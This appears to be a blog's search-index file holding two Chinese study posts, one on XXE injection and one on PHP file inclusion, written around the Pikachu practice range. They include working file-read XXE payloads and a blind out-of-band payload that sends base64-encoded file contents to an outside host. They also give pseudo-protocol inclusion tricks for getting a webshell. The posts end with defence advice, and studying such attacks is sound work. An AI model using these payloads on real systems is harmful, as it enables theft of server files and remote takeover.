<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>XXE</title>
    <link href="/2022/10/13/XXE/"/>
    <url>/2022/10/13/XXE/</url>
    
    <content type="html"><![CDATA[<h4 id="XXE是什么"><a href="#XXE是什么" class="headerlink" title="XXE是什么"></a>XXE是什么</h4><p>做数据传输</p><p>xxe是<strong>xml外部实体注入</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">简单来说，XXE(<span class="hljs-type">XML</span> <span class="hljs-keyword">External</span> Entity Injection)就是<span class="hljs-type">XML</span>外部实体注入。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。<br>例如，如果你当前使用的程序为PHP，则可以将libxml_disable_entity_loader设置为<span class="hljs-keyword">TRUE</span>来禁用外部实体，从而起到防御的目的。<br>XXE漏洞触发的点往往是可以上传<span class="hljs-type">XML</span>文件的位置，没有对上传的<span class="hljs-type">XML</span>文件进行过滤，导致可以上传恶意的<span class="hljs-type">XML</span>文件。<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">XML被设计用来传输和存储数据<br><span class="hljs-selector-tag">html</span>被设计用来显示数据<br></code></pre></td></tr></table></figure><h5 id="XML基本格式与基本语法"><a href="#XML基本格式与基本语法" class="headerlink" title="XML基本格式与基本语法"></a>XML基本格式与基本语法</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml">所有XML元素都必须有关闭标签<br>XML标签对大小写敏感<br>XML必须正确地嵌套<br>XML文档必须有根元素<br>XML的属性值需加引号<br>可以将多个字符放入&lt;![CDATA[内容]]&gt;进行转义<br></code></pre></td></tr></table></figure><h5 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h5><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-built_in">XML</span>文档有自己的一个格式规范，这个格式规范是由一个叫做DTD(document <span class="hljs-keyword">type</span> definition)的东西控制的。<br>DTD用来为<span class="hljs-built_in">XML</span>文档定义语义约束。可以嵌入在<span class="hljs-built_in">XML</span>文档中(内部声明),也可以独立的放在另外一个单独的文件中(外部引用)。是<span class="hljs-built_in">XML</span>文档中的几条语句,用来说明哪些元素/属性是合法的以及元素间应当怎样嵌套/结合，也用来将一些特殊字符和可复用代码段自定义为实体。<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml">DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。<br><br>内部声明:<br><span class="hljs-meta">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span>  例: <span class="hljs-meta">&lt;!DOCTYOE <span class="hljs-keyword">test</span> <span class="hljs-keyword">any</span>&gt;</span><br><br>外部声明:<br> <span class="hljs-meta">&lt;!DOCTYPE 根元素 <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;文件名&quot;</span>&gt;</span> 例:<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&#x27;http://www.test.com/evil.dtd&#x27;</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="XML预定义五个实体引用"><a href="#XML预定义五个实体引用" class="headerlink" title="XML预定义五个实体引用"></a>XML预定义五个实体引用</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-symbol">&amp;lt;</span><span class="hljs-symbol">&amp;gt;</span><span class="hljs-symbol">&amp;amp;</span><span class="hljs-symbol">&amp;apos;</span><span class="hljs-symbol">&amp;quot;</span><br>&lt;&gt;&amp;&#x27;&quot;<br></code></pre></td></tr></table></figure><h5 id="XML实体"><a href="#XML实体" class="headerlink" title="XML实体"></a>XML实体</h5><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams">字符实体<br>命名实体<br>外部实体<br>参数实体<br>内部实体<br>普通实体和参数实体都分为内部实体和外部实体两种，外部实体定义需要加上<span class="hljs-keyword">SYSTEM</span>关键字，其内容是URL所指向的外部文件实际的内容。如果不加<span class="hljs-keyword">SYSTEM</span>关键字，则为内部实体，表示实体指代内容为字符串。<br></code></pre></td></tr></table></figure><h5 id="XML外部实体示例"><a href="#XML外部实体示例" class="headerlink" title="XML外部实体示例"></a>XML外部实体示例</h5><h5 id="无回显时使用"><a href="#无回显时使用" class="headerlink" title="无回显时使用"></a>无回显时使用</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">BP抓包后,修改成POST模式,在后面加上<br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span> <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">creds</span> [  </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">goodies</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///C:/phpStudy/1.txt&quot;</span>&gt;</span> ]&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;goodies;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml">文件一:</span><br><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">all</span></span></span><br><span class="hljs-meta"><span class="language-xml">        <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://10.0.0.19/?%file;&#x27;&gt;&quot;</span></span></span><br><span class="hljs-meta"><span class="language-xml">        &gt;</span></span><br><span class="language-xml"></span><span class="language-perl">        %all;</span><span class="language-xml"></span><br><span class="language-xml">        </span><br><span class="language-xml">文件二</span><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span> [</span></span><br><span class="hljs-meta"><span class="language-xml"> <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///c:/Windows/win.ini&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"> <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://www.localhost.com/xxe_file.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl">%dtd;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl">%send;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br></code></pre></td></tr></table></figure><p>BP中直接显示明文</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span> <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">creds</span> [  </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">goodies</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///C:/phpStudy/WWW/99.txt&quot;</span>&gt;</span> ]&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;goodies;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br>将99.txt文件内容显示出来<br></code></pre></td></tr></table></figure><h5 id="例题-皮卡丘靶场例题-读config-inc-php文件"><a href="#例题-皮卡丘靶场例题-读config-inc-php文件" class="headerlink" title="例题:皮卡丘靶场例题,读config.inc.php文件"></a>例题:皮卡丘靶场例题,读config.inc.php文件</h5><h5 id="使用php-x2F-x2F-filter-x2F-read来转化"><a href="#使用php-x2F-x2F-filter-x2F-read来转化" class="headerlink" title="使用php:&#x2F;&#x2F;filter&#x2F;read来转化"></a>使用php:&#x2F;&#x2F;filter&#x2F;read来转化</h5><p>有回显(使用base64)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span> <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">creds</span> [  </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">goodies</span> <span class="hljs-keyword">SYSTEM</span>  <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///C:/phpStudy/WWW/pikachu-master/inc/config.inc.php&quot;</span>&gt;</span> ]&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;goodies;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure><h6 id="有回显-明文"><a href="#有回显-明文" class="headerlink" title="有回显(明文)"></a>有回显(明文)</h6><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span> <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">creds</span> [  </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">goodies</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///C:/phpStudy/WWW/pikachu-master/1.txt&quot;</span>&gt;</span> ]&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;goodies;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="XXE无回显的利用"><a href="#XXE无回显的利用" class="headerlink" title="XXE无回显的利用"></a>XXE无回显的利用</h5><p>发送给漏洞服务器的包(无回显时也可用)</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/vul/xxe/xxe_1.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>www.pikachu.com<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>287<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://www.pikachu.com<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://www.pikachu.com/vul/xxe/xxe_1.php<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=38avn1v46f2n43a3qe8hrr5u73<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-mojolicious"><span class="language-xml">xml=<span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span></span></span><br><span class="language-xml"><span class="language-mojolicious"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span> [</span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="language-mojolicious"> <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///C:/phpStudy/WWW/pikachu-master/inc/config.inc.php&quot;</span>&gt;</span></span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="language-mojolicious"> <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://www.localhost.com/xxe_file.dtd&quot;</span>&gt;</span></span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="language-mojolicious"></span></span><span class="language-perl">%dtd;</span><span class="language-xml"><span class="hljs-meta"></span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="language-mojolicious"></span></span><span class="language-perl">%send;</span><span class="language-xml"><span class="hljs-meta"></span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="language-mojolicious">]&gt;</span>&amp;submit=%E6%8F%90%E4%BA%A4</span></span><br></code></pre></td></tr></table></figure><h5 id="如何挖掘XXE"><a href="#如何挖掘XXE" class="headerlink" title="如何挖掘XXE"></a>如何挖掘XXE</h5><p>1.手工测试</p><ol><li>有回显XXE:<ol><li>观察请求头Accept字段是否有application&#x2F;xml, text&#x2F;xml等</li><li>提交一个POST请求，请求头加上Content-type:application&#x2F;xml</li><li>提交一个简单的xml测试语句，查看打印结果</li></ol></li><li>无回显XXE<ol><li>提交测试数据</li><li>利用http协议访问攻击主机，然后查看访问日志确定是否存在XXE</li><li>或者利用dnslog，地址: <a href="http://www.dnslog.cnl/">http://www.dnslog.cnl</a></li></ol></li></ol><p>2.代码审计</p><p>3.工具自动化注入</p><h5 id="XXE的防御"><a href="#XXE的防御" class="headerlink" title="XXE的防御"></a>XXE的防御</h5><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">方案一：使用开发语言提供的禁用外部实体的方法<br>PHP<br>libxml<span class="hljs-constructor">_disable_entity_loader(<span class="hljs-params">true</span>)</span>;<br><br>JAVA<br>DocumentBuilderFactory dbf =<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DocumentBuilderFactory</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>;<br>dbf.set<span class="hljs-constructor">ExpandEntityReferences(<span class="hljs-params">false</span>)</span>;<br><br>Python:<br>from lxml import etree<br>xmlData = etree.parse(xmlSource,etree.<span class="hljs-constructor">XMLParser(<span class="hljs-params">resolve_entities</span>=False)</span>)<br><br>方案二：过滤用户提交的XML数据<br>过滤关键词&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>文件包含</title>
    <link href="/2022/10/12/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2022/10/12/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h5 id="文件包含漏洞原理"><a href="#文件包含漏洞原理" class="headerlink" title="文件包含漏洞原理"></a>文件包含漏洞原理</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">文件包含漏洞产生的原因是在通过引入文件时，包含的文件名是用户可控的,由于传入的文件名没有经过合理的校验，或者校验被绕过。<br></code></pre></td></tr></table></figure><h5 id="文件包含漏洞的形成-需要满足两个条件"><a href="#文件包含漏洞的形成-需要满足两个条件" class="headerlink" title="文件包含漏洞的形成,需要满足两个条件"></a>文件包含漏洞的形成,需要满足两个条件</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span><span class="hljs-keyword">include</span>()等函数通过动态变量的方式引入需要包含的文件<br><span class="hljs-number">2.</span>用户能够控制这个动态变量<br></code></pre></td></tr></table></figure><h5 id="PHP中常见包含文件函数"><a href="#PHP中常见包含文件函数" class="headerlink" title="PHP中常见包含文件函数"></a>PHP中常见包含文件函数</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">include_once</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">include</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">require</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">require_once</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">file_get_contents</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">fopen</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><h5 id="文件包含漏洞的危害"><a href="#文件包含漏洞的危害" class="headerlink" title="文件包含漏洞的危害"></a>文件包含漏洞的危害</h5><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">敏感信息泄露<br>获取<span class="hljs-keyword">shell</span><span class="language-bash"></span><br><span class="language-bash">任意命令执行</span><br></code></pre></td></tr></table></figure><h5 id="require和include两个函数的区别"><a href="#require和include两个函数的区别" class="headerlink" title="require和include两个函数的区别"></a>require和include两个函数的区别</h5><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">include</span>:包含的文件不存在时,程序会继续执行<br><span class="hljs-built_in">require</span>:包含的文件不存在时,程序停止执行<br>(如果出现语法错误，两个不会继续执行，如果是找不到这个文件，<span class="hljs-built_in">include</span>继续执行，<span class="hljs-built_in">require</span>，停止执行)<br></code></pre></td></tr></table></figure><h3 id="文件包含分类"><a href="#文件包含分类" class="headerlink" title="文件包含分类"></a>文件包含分类</h3><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">本地文件包含      fopen<br>远程文件包含<span class="hljs-meta"><span class="hljs-keyword">include</span></span><br></code></pre></td></tr></table></figure><h5 id="本地文件包含利用"><a href="#本地文件包含利用" class="headerlink" title="本地文件包含利用"></a>本地文件包含利用</h5><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">上传图片马，包含图片马GetShell<br>读取网站源码以及配置文件<br>包含日志文件GetShell<br>包含session文件拿<span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure><h5 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h5><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-number">1</span>.当被包含的文件在服务器本地时，就形成的本地文件包含漏洞。<br><span class="hljs-number">2</span>.本地文件包含和远程文件包含造成漏洞的原因是一样的，当php.ini中的配置选项allow_url_fopen和allow_url_include为<span class="hljs-keyword">ON</span>的话，则包含的文件可以是第三方服务器中的文件，这样就形成了远程文件包含漏洞。(fopen默认是打开的,本地的;<span class="hljs-keyword">include</span>是远程)<br></code></pre></td></tr></table></figure><p>截断符号</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs haml">?<br><span class="hljs-tag">%<span class="hljs-selector-tag">23</span></span><br></code></pre></td></tr></table></figure><h5 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">第一种：<br>file_get_contents(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]);            <span class="hljs-regexp">//</span>任意文件读取<br><br>第二种:<br><span class="hljs-variable">$a</span> = fopen(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>],<span class="hljs-string">&#x27;r&#x27;</span>);<br>echo fread(<span class="hljs-variable">$a</span>,<span class="hljs-number">200</span>)                          <span class="hljs-regexp">//</span><span class="hljs-number">200</span>是读取长度   <br></code></pre></td></tr></table></figure><h3 id="文件包含相关协议"><a href="#文件包含相关协议" class="headerlink" title="文件包含相关协议"></a>文件包含相关协议</h3><h5 id="php-x2F-x2F-fileter-读取"><a href="#php-x2F-x2F-fileter-读取" class="headerlink" title="php:&#x2F;&#x2F;fileter       读取"></a>php:&#x2F;&#x2F;fileter       读取</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">allow_url_fopen=<span class="hljs-keyword">On</span>      ,     allow_url_include=<span class="hljs-keyword">On</span>/<span class="hljs-keyword">Off</span><br>php://<span class="hljs-keyword">filter</span>/<span class="hljs-keyword">read</span>=convert.base64-encode/resource=文件路径名<br></code></pre></td></tr></table></figure><h5 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">allow_url_fopen=<span class="hljs-keyword">On</span>/<span class="hljs-keyword">Off</span>   ,    allow_url_include=<span class="hljs-keyword">On</span><br>需要<span class="hljs-keyword">GET</span>提交,在BP转换成[POST提交]<br></code></pre></td></tr></table></figure><h5 id="data-text-x2F-plain"><a href="#data-text-x2F-plain" class="headerlink" title="data:text&#x2F;plain"></a>data:text&#x2F;plain</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">allow_url_fopen=On      ,     allow_url_include=On<br>用法<span class="hljs-number">1</span>: ?file=data:text/plain,<span class="hljs-meta">&lt;?php</span>执行内容<span class="hljs-meta">?&gt;</span><br>用法<span class="hljs-number">2</span>: ?file=data:text/plain;base64,编码后的php代码<br>注意base64加密之后的代码,不能够有+号,否则会和url中的+编码冲突<br></code></pre></td></tr></table></figure><h5 id="zip-x2F-x2F"><a href="#zip-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">使用zip协议，需要将<span class="hljs-comment">#编码改为%23，所以需要PHP的版本&gt; =5.3.0，要是因为版本的问题无法将#编码成%23，可以手动把#改成%23</span><br>zip:<span class="hljs-regexp">//</span><span class="hljs-number">1</span>.zip%<span class="hljs-number">231</span>.txt<br>zip:<span class="hljs-regexp">//</span><span class="hljs-number">1</span>.jpg%<span class="hljs-number">231</span>.txt<br></code></pre></td></tr></table></figure><h5 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h5><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">file</span>:<span class="hljs-comment">//可以用来访问本地文件系统，且不受allow_url_fopen与allow_url_include的影响。</span><br>用法：?<span class="hljs-keyword">file</span>=<span class="hljs-keyword">file</span>:<span class="hljs-comment">//文件绝对路径</span><br></code></pre></td></tr></table></figure><h5 id="Phar-x2F-x2F-反序列化漏洞"><a href="#Phar-x2F-x2F-反序列化漏洞" class="headerlink" title="Phar:&#x2F;&#x2F;(反序列化漏洞)"></a>Phar:&#x2F;&#x2F;(反序列化漏洞)</h5><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata">用法:?<span class="hljs-keyword">file</span>=phar:<span class="hljs-comment">//压缩包/内部文件示例:</span><br>phar:<span class="hljs-comment">//xxx.png/shell.php</span><br>注意:PHP &gt;= 5.3.0压缩包需要是<span class="hljs-keyword">zip</span>协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。<br>步骤:写一个一句话木马文件<span class="hljs-keyword">shell</span>.php，然后用<span class="hljs-keyword">zip</span>协议压缩为<span class="hljs-keyword">shell</span>.<span class="hljs-keyword">zip</span>,然后将后缀改为png等其他格式。<br></code></pre></td></tr></table></figure><h5 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h5><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmake">需要magic_quotes_gpc=<span class="hljs-keyword">off</span>,<br>PHP小于<span class="hljs-number">5.3</span>.<span class="hljs-number">4</span>有效<br>用法: <span class="hljs-keyword">test</span>.jpg%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><h5 id="伪协议包含的类型总结"><a href="#伪协议包含的类型总结" class="headerlink" title="伪协议包含的类型总结"></a>伪协议包含的类型总结</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">file:<span class="hljs-regexp">//</span>访问本地文件系统<br>http:<span class="hljs-regexp">//</span>访问 HTTPs 网址<br>Php:<span class="hljs-regexp">//</span>访问输入输出流<br>Zib:<span class="hljs-regexp">//</span>压缩流<br>Data:<span class="hljs-regexp">//</span>数据<br>Phar:<span class="hljs-regexp">//</span><br></code></pre></td></tr></table></figure><h4 id="文件包含漏洞防御"><a href="#文件包含漏洞防御" class="headerlink" title="文件包含漏洞防御"></a>文件包含漏洞防御</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs 